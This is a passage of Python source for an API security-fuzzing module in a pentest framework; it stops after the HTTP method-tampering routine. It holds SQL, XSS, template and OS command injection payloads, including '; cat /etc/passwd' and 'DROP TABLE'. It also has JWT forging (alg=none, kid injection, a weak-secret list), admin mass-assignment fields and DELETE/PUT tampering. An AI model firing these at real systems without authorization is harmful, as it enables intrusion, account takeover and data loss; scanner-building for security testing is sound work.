"""API security fuzzing module — REST, GraphQL, and JWT attack surface testing.

Discovers API schemas (OpenAPI/Swagger, GraphQL introspection), then performs
targeted fuzzing: parameter injection, auth bypass, IDOR, method tampering,
mass assignment, rate limit testing, CORS probing, GraphQL abuse, JWT attacks,
and response analysis for information leakage.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac
import json
import logging
import re
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, urlparse

try:
    import aiohttp
    _aiohttp_available = True
except ImportError:
    aiohttp = None  # type: ignore[assignment]
    _aiohttp_available = False

from pacdoor.core.models import Evidence, ExploitSafety, Finding, Phase, Port, Severity
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Configuration ────────────────────────────────────────────────────────

HTTPS_PORTS: set[int] = {443, 8443}
_REQUEST_TIMEOUT_SECS = 10
_CONCURRENCY = 15
_MAX_BODY_BYTES = 512 * 1024  # 512 KiB
_RATE_LIMIT_BURST = 100

# ── OpenAPI / Swagger discovery paths ────────────────────────────────────

_OPENAPI_PATHS: list[str] = [
    "/swagger.json",
    "/openapi.json",
    "/api-docs",
    "/api-docs.json",
    "/v1/swagger.json",
    "/v1/api-docs",
    "/v2/swagger.json",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/v1/swagger.json",
    "/api/v2/swagger.json",
    "/swagger/v1/swagger.json",
    "/swagger-resources",
    "/swagger-ui.html",
    "/docs",
    "/redoc",
    "/.well-known/openapi.json",
    "/openapi/v3/api-docs",
    "/api/schema",
    "/api/spec",
]

# ── GraphQL discovery paths ──────────────────────────────────────────────

_GRAPHQL_PATHS: list[str] = [
    "/graphql",
    "/gql",
    "/api/graphql",
    "/api/gql",
    "/v1/graphql",
    "/graphql/v1",
    "/query",
    "/api/query",
]

_GRAPHQL_INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}"""

# ── Injection payloads ──────────────────────────────────────────────────

_SQLI_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "'; DROP TABLE users--",
    "1 UNION SELECT null,null,null--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1; WAITFOR DELAY '0:0:5'--",
]

_XSS_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "{{7*7}}",
    "${7*7}",
    "javascript:alert(1)",
]

_SSTI_PAYLOADS: list[tuple[str, str]] = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
]

_CMDI_PAYLOADS: list[str] = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| whoami",
    "& whoami",
]

_SQL_ERROR_SIGNATURES: list[tuple[str, str]] = [
    ("you have an error in your sql syntax", "MySQL"),
    ("mysql_fetch", "MySQL"),
    ("warning: mysql", "MySQL"),
    ("unclosed quotation mark", "MSSQL"),
    ("microsoft ole db", "MSSQL"),
    ("sql server", "MSSQL"),
    ("error: syntax error at or near", "PostgreSQL"),
    ("pg::syntaxerror", "PostgreSQL"),
    ("org.postgresql", "PostgreSQL"),
    ("sqlite_error", "SQLite"),
    ("unrecognized token", "SQLite"),
    ("ora-01756", "Oracle"),
    ("ora-00933", "Oracle"),
]

# ── Mass assignment fields ───────────────────────────────────────────────

_MASS_ASSIGN_FIELDS: dict[str, Any] = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "is_superuser": True,
    "privilege": "admin",
    "permissions": ["admin", "write", "delete"],
    "user_type": "admin",
    "access_level": 9999,
    "is_staff": True,
    "verified": True,
    "email_verified": True,
    "active": True,
    "approved": True,
}

# ── JWT common secrets ──────────────────────────────────────────────────

_JWT_COMMON_SECRETS: list[str] = [
    "secret", "password", "123456", "changeme", "admin",
    "key", "private", "public", "default", "test",
    "jwt_secret", "jwt-secret", "token", "auth", "login",
    "mysecret", "supersecret", "s3cr3t", "hunter2", "letmein",
    "welcome", "monkey", "dragon", "master", "qwerty",
    "abc123", "password1", "12345678", "1234567890", "football",
    "shadow", "michael", "654321", "trustno1", "iloveyou",
    "your-256-bit-secret", "your-384-bit-secret", "your-512-bit-secret",
    "my-secret-key", "hmac-secret", "jwt_secret_key", "app_secret",
    "SECRET_KEY", "application-secret", "api-secret", "signing-key",
    "HS256-secret", "base64secret", "development", "production",
    "staging", "devkey", "testkey", "example", "sample",
    "demo", "CHANGEME", "P@ssw0rd", "keyboard", "baseball",
    "access", "superman", "batman", "1q2w3e4r", "passw0rd",
    "pass123", "hello", "charlie", "donald", "sunshine",
    "princess", "whatever", "trustme", "secret123", "admin123",
    "root", "toor", "administrator", "god", "letmein123",
    "welcome1", "monkey123", "dragon123", "master123", "qwerty123",
    "password123", "123456789", "12345", "111111", "1234",
    "000000", "abc", "abcdef", "7777777",
    "121212", "password!", "secret!", "Security1", "Security123",
    "P@ss1234", "Winter2024", "Summer2024", "Spring2024", "Fall2024",
    "Autumn2024", "January2024", "Company123", "Welcome1!",
    "Passw0rd!", "Admin@123", "Test@123", "User@123",
]

# ── Sensitive data patterns ──────────────────────────────────────────────

_SENSITIVE_PATTERNS: list[tuple[str, str, str]] = [
    (r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "email", "Email address"),
    (r"\b\d{3}-\d{2}-\d{4}\b", "ssn", "Social Security Number"),
    (r"\b\d{3}[- ]?\d{3}[- ]?\d{4}\b", "phone", "Phone number"),
    (r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b", "credit_card", "Credit card number"),
    (r"\b[A-Za-z0-9]{40}\b", "api_key_candidate", "Possible API key (40-char hex)"),
    (r"(?i)password[\"']?\s*[:=]\s*[\"'][^\"']+[\"']", "password_leak", "Hardcoded password"),
    (r"(?i)(?:aws_?(?:access_?key|secret)|AKIA[0-9A-Z]{16})", "aws_key", "AWS credential"),
    (r"\b(?:sk-[a-zA-Z0-9]{20,}|pk_live_[a-zA-Z0-9]{20,})\b", "stripe_key", "Stripe API key"),
]

# ── Stack trace / error patterns ─────────────────────────────────────────

_ERROR_PATTERNS: list[tuple[str, str]] = [
    ("Traceback (most recent call last)", "Python stack trace"),
    ("at java.", "Java stack trace"),
    ("at sun.", "Java stack trace"),
    ("Exception in thread", "Java exception"),
    ("System.NullReferenceException", ".NET exception"),
    ("System.Web.HttpException", ".NET exception"),
    ("Microsoft.AspNetCore", "ASP.NET Core exception"),
    ("node_modules/", "Node.js stack trace"),
    ("TypeError:", "JavaScript/Python error"),
    ("ReferenceError:", "JavaScript error"),
    ("SyntaxError:", "JavaScript/Python syntax error"),
    ("Fatal error:", "PHP fatal error"),
    ("Warning: ", "PHP warning"),
    ("Notice: ", "PHP notice"),
    ("SQLSTATE[", "PDO/Database error"),
    ("pg_query(): ", "PostgreSQL error"),
    ("mysql_connect(): ", "MySQL error"),
    ("/home/", "Internal path disclosure"),
    ("/var/www/", "Internal path disclosure"),
    ("C:\\Users\\", "Internal path disclosure (Windows)"),
    ("C:\\inetpub\\", "Internal path disclosure (Windows)"),
]

# ── Internal IP patterns ─────────────────────────────────────────────────

_INTERNAL_IP_PATTERN = re.compile(
    r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}"
    r"|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}"
    r"|192\.168\.\d{1,3}\.\d{1,3})\b"
)


# ── Helpers ──────────────────────────────────────────────────────────────


def _scheme_for_port(port: int) -> str:
    return "https" if port in HTTPS_PORTS else "http"


def _b64url_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    """Base64url decode with padding restoration."""
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _forge_jwt_none(token: str) -> str | None:
    """Create a JWT with alg=none (unsigned) from an existing token."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (json.JSONDecodeError, Exception):
        return None
    header["alg"] = "none"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{new_header}.{parts[1]}."


def _sign_jwt_hs256(token: str, secret: str) -> str | None:
    """Re-sign a JWT with HS256 using the given secret."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (json.JSONDecodeError, Exception):
        return None
    header["alg"] = "HS256"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{parts[1]}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{new_header}.{parts[1]}.{_b64url_encode(sig)}"


def _decode_jwt_payload(token: str) -> dict[str, Any] | None:
    """Decode the payload of a JWT without verification."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    try:
        return json.loads(_b64url_decode(parts[1]))
    except (json.JSONDecodeError, Exception):
        return None


def _make_expired_jwt(token: str) -> str | None:
    """Create a JWT with an expired timestamp."""
    parts = token.split(".")
    if len(parts) < 3:
        return None
    try:
        _b64url_decode(parts[0])
        payload = json.loads(_b64url_decode(parts[1]))
    except (json.JSONDecodeError, Exception):
        return None
    payload["exp"] = 1000000000  # far in the past (2001-09-08)
    payload["iat"] = 999999000
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{parts[0]}.{new_payload}.{parts[2]}"


def _make_kid_injection_jwt(token: str) -> str | None:
    """Create a JWT with kid header parameter injection."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except (json.JSONDecodeError, Exception):
        return None
    # SQL injection via kid parameter
    header["kid"] = "' UNION SELECT 'secret' -- "
    header["alg"] = "HS256"
    new_header = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{parts[1]}".encode()
    sig = hmac.new(b"secret", signing_input, hashlib.sha256).digest()
    return f"{new_header}.{parts[1]}.{_b64url_encode(sig)}"


# ── Module ───────────────────────────────────────────────────────────────


class ApiFuzzerModule(BaseModule):
    """API security fuzzing — REST, GraphQL, and JWT attack testing."""

    name = "vuln.api_fuzzer"
    description = "API security fuzzing: REST injection, auth bypass, GraphQL abuse, JWT attacks"
    phase = Phase.VULN_SCAN
    safety = ExploitSafety.MODERATE
    attack_technique_ids = ["T1190"]
    required_facts = ["service.http"]
    produced_facts = ["vuln.api", "api.schema", "api.graphql"]

    # ── Pre-check ────────────────────────────────────────────────────────

    async def check(self, ctx: ModuleContext) -> bool:
        if not _aiohttp_available:
            log.debug("aiohttp not installed -- skipping API fuzzer")
            return False
        return await super().check(ctx)

    # ── Main entry point ─────────────────────────────────────────────────

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        http_ports: list[Port] = await ctx.facts.get_values("service.http")
        if not http_ports:
            return []

        findings: list[Finding] = []
        sem = asyncio.Semaphore(_CONCURRENCY)

        timeout = aiohttp.ClientTimeout(total=_REQUEST_TIMEOUT_SECS)
        connector = aiohttp.TCPConnector(limit=_CONCURRENCY, ssl=False)
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
        ) as session:
            for port_obj in http_ports:
                ip = await self.resolve_ip(ctx, port_obj.host_id)
                if ip is None:
                    continue
                scheme = _scheme_for_port(port_obj.port)
                base_url = f"{scheme}://{ip}:{port_obj.port}"

                # Phase 1: Auto-discovery
                api_schema = await self._discover_openapi(ctx, session, sem, base_url)
                graphql_url = await self._discover_graphql(ctx, session, sem, base_url)

                if api_schema:
                    await ctx.facts.add(
                        "api.schema",
                        {"base_url": base_url, "spec_type": "openapi"},
                        self.name,
                        host_id=port_obj.host_id,
                    )

                if graphql_url:
                    await ctx.facts.add(
                        "api.graphql",
                        {"url": graphql_url},
                        self.name,
                        host_id=port_obj.host_id,
                    )

                # Collect discovered endpoints
                endpoints = await self._extract_endpoints(
                    ctx, api_schema, base_url, port_obj,
                )

                # Also pull in paths from http_enum facts
                http_paths: list[dict] = await ctx.facts.get_for_host(
                    "http.paths", port_obj.host_id,
                )
                for entry in http_paths:
                    if isinstance(entry, dict) and "path" in entry:
                        path = entry["path"]
                        if entry.get("port") == port_obj.port:
                            full_url = f"{base_url}{path}" if path.startswith("/") else f"{base_url}/{path}"
                            endpoints.append({
                                "url": full_url,
                                "method": "GET",
                                "params": [],
                                "body_params": [],
                            })

                if not endpoints:
                    # Fallback: probe common API paths
                    endpoints = self._generate_fallback_endpoints(base_url)

                # Phase 2: REST API fuzzing
                tasks: list[asyncio.Task] = []

                for ep in endpoints:
                    tasks.append(asyncio.ensure_future(
                        self._fuzz_endpoint(ctx, session, sem, ep, port_obj, findings)
                    ))

                # Phase 3: Auth bypass testing
                tasks.append(asyncio.ensure_future(
                    self._test_auth_bypass(ctx, session, sem, endpoints, port_obj, findings)
                ))

                # Phase 4: CORS misconfiguration
                tasks.append(asyncio.ensure_future(
                    self._test_cors(ctx, session, sem, base_url, port_obj, findings)
                ))

                # Phase 5: Rate limit testing
                tasks.append(asyncio.ensure_future(
                    self._test_rate_limiting(ctx, session, sem, base_url, port_obj, findings)
                ))

                # Phase 6: GraphQL-specific attacks
                if graphql_url:
                    tasks.append(asyncio.ensure_future(
                        self._fuzz_graphql(ctx, session, sem, graphql_url, port_obj, findings)
                    ))

                # Phase 7: Response analysis on base URL
                tasks.append(asyncio.ensure_future(
                    self._analyze_responses(ctx, session, sem, base_url, endpoints, port_obj, findings)
                ))

                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)

        return findings

    # ── HTTP helper ──────────────────────────────────────────────────────

    async def _fetch(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        method: str = "GET",
        headers: dict[str, str] | None = None,
        json_body: Any = None,
        data: str | None = None,
        allow_redirects: bool = False,
    ) -> tuple[int, dict[str, str], str] | None:
        """Rate-limited HTTP request; returns (status, headers, body) or None."""
        async with sem:
            await ctx.rate_limiter.acquire()
            try:
                kwargs: dict[str, Any] = {
                    "allow_redirects": allow_redirects,
                }
                if headers:
                    kwargs["headers"] = headers
                if json_body is not None:
                    kwargs["json"] = json_body
                if data is not None:
                    kwargs["data"] = data

                async with session.request(method, url, **kwargs) as resp:
                    body_bytes = await resp.content.read(_MAX_BODY_BYTES)
                    body = body_bytes.decode("utf-8", errors="replace")
                    resp_headers = {k: v for k, v in resp.headers.items()}
                    return resp.status, resp_headers, body
            except (TimeoutError, aiohttp.ClientError, OSError):
                return None

    # ── Phase 1: OpenAPI / Swagger discovery ─────────────────────────────

    async def _discover_openapi(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        base_url: str,
    ) -> dict[str, Any] | None:
        """Probe common OpenAPI/Swagger endpoints and return parsed schema."""
        for path in _OPENAPI_PATHS:
            url = f"{base_url}{path}"
            result = await self._fetch(ctx, session, sem, url)
            if result is None:
                continue
            status, headers, body = result
            if status != 200:
                continue

            content_type = headers.get("Content-Type", "")
            # Try to parse as JSON (OpenAPI spec)
            try:
                spec = json.loads(body)
                # Validate it looks like an OpenAPI/Swagger spec
                if isinstance(spec, dict) and (
                    "openapi" in spec
                    or "swagger" in spec
                    or "paths" in spec
                    or "info" in spec
                ):
                    log.debug("Discovered OpenAPI spec at %s", url)
                    return spec
            except (json.JSONDecodeError, ValueError):
                # Check if it's a Swagger UI HTML page
                if "swagger" in body.lower() and "text/html" in content_type.lower():
                    # Try to extract the spec URL from the page
                    spec_url = self._extract_spec_url(body, base_url)
                    if spec_url:
                        spec_result = await self._fetch(ctx, session, sem, spec_url)
                        if spec_result and spec_result[0] == 200:
                            try:
                                return json.loads(spec_result[2])
                            except (json.JSONDecodeError, ValueError):
                                pass
        return None

    def _extract_spec_url(self, html: str, base_url: str) -> str | None:
        """Try to extract an OpenAPI spec URL from Swagger UI HTML."""
        # Look for url: "..." or url: '...' patterns in JavaScript
        patterns = [
            r'url\s*:\s*["\']([^"\']+\.json)["\']',
            r'url\s*:\s*["\']([^"\']+/api-docs[^"\']*)["\']',
            r'spec-url\s*=\s*["\']([^"\']+)["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                spec_path = match.group(1)
                if spec_path.startswith("http"):
                    return spec_path
                return urljoin(base_url, spec_path)
        return None

    # ── Phase 1: GraphQL discovery ───────────────────────────────────────

    async def _discover_graphql(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        base_url: str,
    ) -> str | None:
        """Probe common GraphQL endpoints and detect via introspection."""
        introspection_body = {"query": "{ __typename }"}

        for path in _GRAPHQL_PATHS:
            url = f"{base_url}{path}"
            result = await self._fetch(
                ctx, session, sem, url,
                method="POST",
                headers={"Content-Type": "application/json"},
                json_body=introspection_body,
            )
            if result is None:
                continue
            status, headers, body = result
            if status not in (200, 400, 405):
                continue

            try:
                resp_json = json.loads(body)
                if isinstance(resp_json, dict) and (
                    "data" in resp_json or "errors" in resp_json
                ):
                    log.debug("Discovered GraphQL endpoint at %s", url)
                    return url
            except (json.JSONDecodeError, ValueError):
                pass

            # Also try GET with query param
            get_url = f"{url}?query={{__typename}}"
            get_result = await self._fetch(ctx, session, sem, get_url)
            if get_result and get_result[0] == 200:
                try:
                    resp_json = json.loads(get_result[2])
                    if isinstance(resp_json, dict) and "data" in resp_json:
                        log.debug("Discovered GraphQL endpoint (GET) at %s", url)
                        return url
                except (json.JSONDecodeError, ValueError):
                    pass

        return None

    # ── Endpoint extraction ──────────────────────────────────────────────

    async def _extract_endpoints(
        self,
        ctx: ModuleContext,
        schema: dict[str, Any] | None,
        base_url: str,
        port_obj: Port,
    ) -> list[dict[str, Any]]:
        """Parse an OpenAPI schema into a list of endpoint descriptors."""
        endpoints: list[dict[str, Any]] = []
        if schema is None:
            return endpoints

        paths = schema.get("paths", {})
        if not isinstance(paths, dict):
            return endpoints

        # Determine base path from servers or basePath
        api_base = ""
        if "basePath" in schema:
            api_base = schema["basePath"].rstrip("/")
        elif "servers" in schema and isinstance(schema["servers"], list):
            for server in schema["servers"]:
                if isinstance(server, dict) and "url" in server:
                    parsed = urlparse(server["url"])
                    if parsed.path and parsed.path != "/":
                        api_base = parsed.path.rstrip("/")
                    break

        for path, methods in paths.items():
            if not isinstance(methods, dict):
                continue
            full_path = f"{api_base}{path}" if not path.startswith(api_base) else path
            full_url = f"{base_url}{full_path}"

            for method, details in methods.items():
                method_upper = method.upper()
                if method_upper not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
                    continue
                if not isinstance(details, dict):
                    continue

                query_params: list[str] = []
                body_params: list[str] = []
                requires_auth = False

                # Extract parameters
                params = details.get("parameters", [])
                if isinstance(params, list):
                    for param in params:
                        if not isinstance(param, dict):
                            continue
                        pname = param.get("name", "")
                        pin = param.get("in", "")
                        if pin == "query":
                            query_params.append(pname)
                        elif pin == "path":
                            # Replace path parameters with test values
                            full_url = full_url.replace(f"{{{pname}}}", "1")

                # Extract request body fields
                request_body = details.get("requestBody", {})
                if isinstance(request_body, dict):
                    content = request_body.get("content", {})
                    if isinstance(content, dict):
                        for ctype, cval in content.items():
                            if "json" in ctype and isinstance(cval, dict):
                                schema_obj = cval.get("schema", {})
                                if isinstance(schema_obj, dict):
                                    props = schema_obj.get("properties", {})
                                    if isinstance(props, dict):
                                        body_params.extend(props.keys())

                # Check for security requirements
                if details.get("security") or schema.get("security"):
                    requires_auth = True

                endpoints.append({
                    "url": full_url,
                    "method": method_upper,
                    "params": query_params,
                    "body_params": body_params,
                    "requires_auth": requires_auth,
                    "path": full_path,
                })

        return endpoints

    def _generate_fallback_endpoints(self, base_url: str) -> list[dict[str, Any]]:
        """Generate common API endpoint patterns when no schema is found."""
        common_paths = [
            "/api/users", "/api/v1/users", "/api/v2/users",
            "/api/admin", "/api/v1/admin",
            "/api/login", "/api/v1/login", "/api/auth/login",
            "/api/register", "/api/v1/register",
            "/api/profile", "/api/v1/profile", "/api/me",
            "/api/search", "/api/v1/search",
            "/api/config", "/api/v1/config", "/api/settings",
            "/api/health", "/api/status", "/api/version",
            "/api/upload", "/api/files", "/api/data",
            "/api/items", "/api/products", "/api/orders",
        ]
        endpoints: list[dict[str, Any]] = []
        for path in common_paths:
            endpoints.append({
                "url": f"{base_url}{path}",
                "method": "GET",
                "params": ["id", "q", "page", "limit"],
                "body_params": [],
            })
        return endpoints

    # ── Phase 2: REST API fuzzing ────────────────────────────────────────

    async def _fuzz_endpoint(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        endpoint: dict[str, Any],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Run injection and method tampering tests on a single endpoint."""
        url = endpoint["url"]
        method = endpoint.get("method", "GET")
        params = endpoint.get("params", [])
        body_params = endpoint.get("body_params", [])

        # 2.1 Parameter injection (query params)
        for param in params:
            await self._test_param_injection(ctx, session, sem, url, param, port_obj, findings)

        # 2.2 Body parameter injection (JSON)
        if method in ("POST", "PUT", "PATCH") and body_params:
            await self._test_body_injection(ctx, session, sem, url, method, body_params, port_obj, findings)

        # 2.3 HTTP method tampering
        await self._test_method_tampering(ctx, session, sem, url, method, port_obj, findings)

        # 2.4 Mass assignment
        if method in ("POST", "PUT", "PATCH"):
            await self._test_mass_assignment(ctx, session, sem, url, method, body_params, port_obj, findings)

        # 2.5 IDOR testing
        await self._test_idor(ctx, session, sem, url, port_obj, findings)

    async def _test_param_injection(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        param: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test a single query parameter for SQL injection, XSS, SSTI, and command injection."""
        # SQLi
        for payload in _SQLI_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={payload}"
            result = await self._fetch(ctx, session, sem, test_url)
            if result is None:
                continue
            status, headers, body = result
            body_lower = body.lower()

            for sig, db_engine in _SQL_ERROR_SIGNATURES:
                if sig in body_lower:
                    finding = Finding(
                        title=f"SQL Injection in API param '{param}' on {url}",
                        description=(
                            f"The API parameter '{param}' is vulnerable to "
                            f"error-based SQL injection. Payload '{payload}' "
                            f"triggered a {db_engine} error in the response."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=port_obj.host_id,
                        port_id=port_obj.id,
                        module_name=self.name,
                        attack_technique_ids=self.attack_technique_ids,
                        evidence=[
                            Evidence(kind="request", data=f"GET {test_url}"),
                            Evidence(kind="error_signature", data=sig),
                            Evidence(kind="db_engine", data=db_engine),
                        ],
                        remediation=(
                            "Use parameterized queries or an ORM. Never "
                            "concatenate user input into SQL statements."
                        ),
                        verified=True,
                    )
                    findings.append(finding)
                    await ctx.facts.add(
                        "vuln.api",
                        {"type": "sqli", "param": param, "url": url, "db": db_engine},
                        self.name,
                        host_id=port_obj.host_id,
                    )
                    if ctx.db is not None:
                        await ctx.db.insert_finding(finding)
                    return

        # XSS
        for payload in _XSS_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={payload}"
            result = await self._fetch(ctx, session, sem, test_url)
            if result is None:
                continue
            _, _, body = result
            if payload in body:
                finding = Finding(
                    title=f"Reflected XSS in API param '{param}' on {url}",
                    description=(
                        f"The API parameter '{param}' reflects user input "
                        f"unencoded in the response. Payload: '{payload}'."
                    ),
                    severity=Severity.HIGH,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request", data=f"GET {test_url}"),
                        Evidence(kind="reflection", data=f"Payload reflected in body"),
                    ],
                    remediation=(
                        "Apply context-aware output encoding. Set Content-Type "
                        "to application/json for API responses. Use CSP headers."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "xss", "param": param, "url": url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                return

        # SSTI
        for payload, expected in _SSTI_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={payload}"
            result = await self._fetch(ctx, session, sem, test_url)
            if result is None:
                continue
            _, _, body = result
            if expected in body and payload not in body:
                finding = Finding(
                    title=f"SSTI in API param '{param}' on {url}",
                    description=(
                        f"The API parameter '{param}' is vulnerable to "
                        f"Server-Side Template Injection. The expression "
                        f"'{payload}' evaluated to '{expected}'."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request", data=f"GET {test_url}"),
                        Evidence(kind="evaluation", data=f"'{payload}' -> '{expected}'"),
                    ],
                    remediation=(
                        "Never pass user input into template rendering. "
                        "Use a sandboxed template engine with auto-escaping."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "ssti", "param": param, "url": url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                return

        # Command injection
        for payload in _CMDI_PAYLOADS:
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}{param}={payload}"
            result = await self._fetch(ctx, session, sem, test_url)
            if result is None:
                continue
            _, _, body = result
            # Look for command output markers
            if any(marker in body for marker in ("uid=", "root:", "www-data", "nobody")):
                finding = Finding(
                    title=f"Command Injection in API param '{param}' on {url}",
                    description=(
                        f"The API parameter '{param}' is vulnerable to "
                        f"OS command injection. Payload '{payload}' produced "
                        f"system command output in the response."
                    ),
                    severity=Severity.CRITICAL,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request", data=f"GET {test_url}"),
                        Evidence(kind="output", data=body[:500]),
                    ],
                    remediation=(
                        "Never pass user input to shell commands. Use "
                        "language-native APIs instead of exec/system calls. "
                        "Apply strict input validation with allowlists."
                    ),
                    verified=True,
                )
                findings.append(finding)
                await ctx.facts.add(
                    "vuln.api",
                    {"type": "cmdi", "param": param, "url": url},
                    self.name,
                    host_id=port_obj.host_id,
                )
                if ctx.db is not None:
                    await ctx.db.insert_finding(finding)
                return

    async def _test_body_injection(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        method: str,
        body_params: list[str],
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Test JSON body parameters for injection vulnerabilities."""
        for param in body_params:
            for payload in _SQLI_PAYLOADS[:3]:  # Limit to top 3 for body params
                json_body = {param: payload}
                result = await self._fetch(
                    ctx, session, sem, url,
                    method=method,
                    headers={"Content-Type": "application/json"},
                    json_body=json_body,
                )
                if result is None:
                    continue
                status, headers, body = result
                body_lower = body.lower()

                for sig, db_engine in _SQL_ERROR_SIGNATURES:
                    if sig in body_lower:
                        finding = Finding(
                            title=f"SQL Injection in API body param '{param}' on {url}",
                            description=(
                                f"The JSON body parameter '{param}' is vulnerable "
                                f"to SQL injection via {method} request. "
                                f"Payload '{payload}' triggered a {db_engine} error."
                            ),
                            severity=Severity.CRITICAL,
                            host_id=port_obj.host_id,
                            port_id=port_obj.id,
                            module_name=self.name,
                            attack_technique_ids=self.attack_technique_ids,
                            evidence=[
                                Evidence(kind="request", data=f"{method} {url}"),
                                Evidence(kind="body", data=json.dumps(json_body)),
                                Evidence(kind="error_signature", data=sig),
                            ],
                            remediation=(
                                "Use parameterized queries. Validate and sanitize "
                                "all input from request bodies."
                            ),
                            verified=True,
                        )
                        findings.append(finding)
                        await ctx.facts.add(
                            "vuln.api",
                            {"type": "sqli_body", "param": param, "url": url},
                            self.name,
                            host_id=port_obj.host_id,
                        )
                        if ctx.db is not None:
                            await ctx.db.insert_finding(finding)
                        return

    # ── 2.3 HTTP method tampering ────────────────────────────────────────

    async def _test_method_tampering(
        self,
        ctx: ModuleContext,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        url: str,
        original_method: str,
        port_obj: Port,
        findings: list[Finding],
    ) -> None:
        """Try dangerous HTTP methods on endpoints that normally use safe methods."""
        if original_method not in ("GET", "HEAD"):
            return

        tamper_methods = ["PUT", "DELETE", "PATCH"]
        for method in tamper_methods:
            result = await self._fetch(
                ctx, session, sem, url, method=method,
                headers={"Content-Type": "application/json"},
                json_body={},
            )
            if result is None:
                continue
            status, headers, body = result

            # A 2xx or 4xx (but not 405) response suggests the method is accepted
            if status < 500 and status != 405 and status != 404:
                finding = Finding(
                    title=f"HTTP method {method} accepted on GET endpoint {url}",
                    description=(
                        f"The endpoint {url} accepts {method} requests "
                        f"(HTTP {status}) despite being documented as a "
                        f"GET-only endpoint. This may allow unauthorized "
                        f"data modification or deletion."
                    ),
                    severity=Severity.MEDIUM,
                    host_id=port_obj.host_id,
                    port_id=port_obj.id,
                    module_name=self.name,
                    attack_technique_ids=self.attack_technique_ids,
                    evidence=[
                        Evidence(kind="request", data=f"{method} {url}"),
                        Evidence(kind="response", data=f"HTTP {status}"),
                    ],
                    remediation=(
                        "Explicitly restrict allowed HTTP methods per endpoint. "
                        "Return 405 Method Not Allowed for unsupported methods."
                    ),
                )
                findings.append(finding)
